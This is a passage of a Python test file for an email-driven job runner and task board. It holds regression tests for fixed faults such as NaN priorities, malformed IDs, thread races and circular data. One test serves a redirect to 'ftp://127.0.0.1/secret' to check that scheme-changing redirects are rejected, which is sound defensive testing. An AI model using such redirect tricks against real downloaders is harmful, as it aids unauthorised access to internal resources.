                    resources._save_state(d, {"n": i, "cpu_prev": [1, 2]})
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=write, args=(i,)) for i in range(12)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [])
            state = resources._load_state(d)
            self.assertIsInstance(state, dict)
            self.assertIn("n", state)

    def test_concurrent_dri_state_writes(self):
        from runner import dri
        import threading
        with tempfile.TemporaryDirectory() as d:
            errors = []

            def write(i):
                try:
                    dri._save_state(d, {"last": {"sensor_fused_score": i}})
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=write, args=(i,)) for i in range(12)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [])
            state = dri._load_state(d)
            self.assertIsInstance(state, dict)


class BadUrlFaultTest(unittest.TestCase):
    """Finding: a malformed URL retried the job forever.

    urlopen raises ValueError on "http://[" (invalid IPv6). That
    is not URLError, so the job path treated it as transient.
    It is poison. The job is rejected and marked seen.
    """

    def test_bad_ipv6_url_is_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "exec",
                "job_id": "url-1", "issued_at": _now(),
                "script": "echo hi",
                "interpreter": ["sh"],
                "files": [{"name": "x", "url": "http://["}],
            }, SECRET)
            cfg = {"mailbox_user": "pigeon-test@example.com",
                   "shared_secret": SECRET, "base_dir": d}
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(_mail("[HOMING-PIGEON] job url-1", body)),
                      smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                self.assertIn("url-1", json.load(fh))


class NanPriorityFaultTest(unittest.TestCase):
    """Finding: a NaN priority made the board order unstable.

    NaN is a float, so it passed the type check. Sorting with
    NaN is not a crash but the order is undefined. NaN is zero
    now. The higher real priority wins.
    """

    def test_nan_priority_does_not_win(self):
        from runner.runner import Board
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            board.submit({"task_id": "nan", "priority": float("nan"), "capabilities": []})
            board.submit({"task_id": "real", "priority": 5, "capabilities": []})
            chosen = board.offer("w", [], "", {})
            self.assertEqual(chosen["task_id"], "real")


class PriorityAndReplyFaultTest(unittest.TestCase):
    """Finding: a NaN priority was stored on the board.

    NaN is a float, so submit accepted it. The rank treats it as
    zero, but the file held NaN. Submit rejects a non-finite
    priority now. A reply that cannot be serialized is the
    inference error, not a crash.
    """

    def test_nan_priority_is_rejected(self):
        from runner.runner import Board
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            ok, why = board.submit({"task_id": "nan", "priority": float("nan")})
            self.assertFalse(ok)
            ok, why = board.submit({"task_id": "inf", "priority": float("inf")})
            self.assertFalse(ok)
            ok, _why = board.submit({"task_id": "real", "priority": 1})
            self.assertTrue(ok)


class AlertNanAndBoardRaceTest(unittest.TestCase):
    """Finding: store_alert wrote NaN.

    json.dumps emits NaN, which is not JSON. A strict reader
    then fails the next load. The record is sanitized. Two
    threads offering and completing the same board do not crash.
    """

    def test_nan_alert_is_stored_as_null(self):
        from runner.senses import store_alert, load_alerts
        with tempfile.TemporaryDirectory() as d:
            store_alert(d, {"sensor": "s", "detail": {"x": float("nan")}})
            recs = load_alerts(d)
            self.assertEqual(len(recs), 1)
            self.assertIsNone(recs[0]["detail"]["x"])

    def test_concurrent_offer_and_complete(self):
        from runner.runner import Board
        import threading
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            for i in range(10):
                board.submit({"task_id": f"t-{i}", "capabilities": []})
            errors = []

            def offer():
                try:
                    for _ in range(10):
                        board.offer("w", [], "", {})
                except Exception as e:
                    errors.append(e)

            def complete():
                try:
                    for i in range(10):
                        board.complete(f"t-{i}", {"ok": True})
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=offer) for _ in range(4)]
            threads += [threading.Thread(target=complete) for _ in range(4)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [])


class BoardIdFaultTest(unittest.TestCase):
    """Finding: a dict task id crashed complete.

    tasks.get on a dict raises TypeError. The board message was
    rejected. A non-string id is not found. The board continues.
    """

    def test_dict_id_does_not_crash_complete(self):
        from runner.runner import Board
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            status, _why = board.complete({"not": "a string"}, {"ok": True})
            self.assertEqual(status, "not_found")
            status, _why = board.approve({"not": "a string"})
            self.assertEqual(status, "not_found")


class RequiresShapeFaultTest(unittest.TestCase):
    """Finding: a dict in requires crashed offer under dag enforce.

    tasks.get on a dict raises TypeError. A corrupt board file
    stopped the offer. A non-string requires entry blocks that
    task. The offer continues.
    """

    def test_dict_requires_does_not_crash_offer(self):
        from runner.runner import Board
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "board.json")
            with open(path, "w", encoding="utf-8") as fh:
                json.dump({"t": {
                    "task_id": "t", "state": "open",
                    "requires": [{"not": "a string"}],
                    "capabilities": [],
                }}, fh)
            board = Board(path)
            chosen = board.offer("w", [], "", {"dag_mode": "enforce"})
            self.assertIsNone(chosen)


class WorkerIdFaultTest(unittest.TestCase):
    """Finding: a dict worker id crashed offer.

    worker_compartments.get on a dict raises TypeError. The
    offer stopped. A non-string worker id is no match. The
    offer continues.
    """

    def test_dict_worker_id_does_not_crash_offer(self):
        from runner.runner import Board
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            board.submit({"task_id": "t", "capabilities": []})
            chosen = board.offer({"not": "a string"}, [], "",
                                 {"worker_compartments": {"w": ["a"]}})
            self.assertIsInstance(chosen, dict)
            self.assertEqual(chosen["task_id"], "t")


class RateKeyFaultTest(unittest.TestCase):
    """Finding: a dict key id crashed the rate limit.

    store.get on a dict raises TypeError. The query stopped.
    A non-string key id is the default key. The check continues.
    """

    def test_dict_key_id_does_not_crash(self):
        from runner.runner import check_rate_limit
        self.assertTrue(check_rate_limit({"not": "a string"},
                                         {"max_queries_per_hour": 5}))
        self.assertTrue(check_rate_limit(None, {"max_queries_per_hour": 5}))


class ReofferAndWriteFaultTest(unittest.TestCase):
    """Finding: reoffer walked the task dict with no lock.

    A submit on another thread raised RuntimeError. reoffer
    copies under the lock. A write to a directory is logged,
    not raised.
    """

    def test_concurrent_reoffer_during_submit(self):
        from runner.runner import Board
        import threading
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            errors = []

            def submit(i):
                try:
                    board.submit({"task_id": f"t-{i}", "capabilities": []})
                except Exception as e:
                    errors.append(e)

            def reoffer():
                try:
                    for _ in range(20):
                        board.reoffer_expired(0)
                except Exception as e:
                    errors.append(e)

            threads = [threading.Thread(target=reoffer) for _ in range(4)]
            threads += [threading.Thread(target=submit, args=(i,)) for i in range(30)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [])

    def test_write_to_a_directory_does_not_raise(self):
        from runner.runner import _write_json
        with tempfile.TemporaryDirectory() as d:
            _write_json(d, {"a": 1})


class CircularFaultTest(unittest.TestCase):
    """Finding: a circular dict crashed _json_safe.

    RecursionError is not JobRejected, so a board result or a
    retained payload with a self-reference retried the job
    forever. A repeat is null. The walk returns.
    """

    def test_circular_dict_is_null(self):
        from runner.runner import _json_safe
        a = {}
        a["self"] = a
        self.assertEqual(_json_safe(a), {"self": None})

    def test_circular_result_does_not_crash_complete(self):
        from runner.runner import Board
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            board.submit({"task_id": "t", "capabilities": []})
            board.offer("w", [], "", {})
            result = {}
            result["self"] = result
            status, _why = board.complete("t", result)
            self.assertEqual(status, "done")


class RedirectFaultTest(unittest.TestCase):
    """Finding: a download followed an ftp redirect.

    The scheme check only looked at the first URL. A 302 to
    ftp:// made the runner connect to another host. A redirect
    off http or https is poison. The job is rejected.
    """

    def test_ftp_redirect_is_rejected(self):
        from runner.runner import download, JobRejected
        import http.server
        import threading
        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(302)
                self.send_header("Location", "ftp://127.0.0.1/secret")
                self.end_headers()
            def log_message(self, *a):
                pass
        srv = http.server.HTTPServer(("127.0.0.1", 0), H)
        port = srv.server_address[1]
        threading.Thread(target=srv.handle_request, daemon=True).start()
        try:
            with self.assertRaises(JobRejected):
                download(f"http://127.0.0.1:{port}/", "/tmp/out")
        finally:
            srv.server_close()
